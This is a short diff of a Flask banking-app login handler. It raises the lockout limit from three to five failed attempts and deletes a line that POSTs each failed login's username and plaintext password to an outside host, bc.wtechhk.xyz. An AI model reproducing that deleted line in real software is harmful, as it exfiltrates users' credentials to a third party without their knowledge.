@@ -2822,14 +2822,13 @@ def wbank_auth_client():
                     tryTimes += 1
                     session["tryTimes"] = tryTimes
                     session.permanent = True
-                    if tryTimes >= 3:
-                        user.sub = '你的帳戶被鎖定，原因：錯誤登入3次'
+                    if tryTimes >= 5:
+                        user.sub = '你的帳戶被鎖定，原因：錯誤登入5次'
                         db.session.commit()  # 提交更改
                         flash(user.sub, 'error')
                         return redirect("/wbank")
                     else:
                         msg = f"密碼錯誤，嘗試次數：{tryTimes}"
-                        requests.post(url="https://bc.wtechhk.xyz/upload",data={"blockID":"128"+str(random.randint(1000,9999)),"data":f"login->{username}->{password}->{msg}"})
                         flash(msg, "error")
                         return redirect("/wbank")
             else:
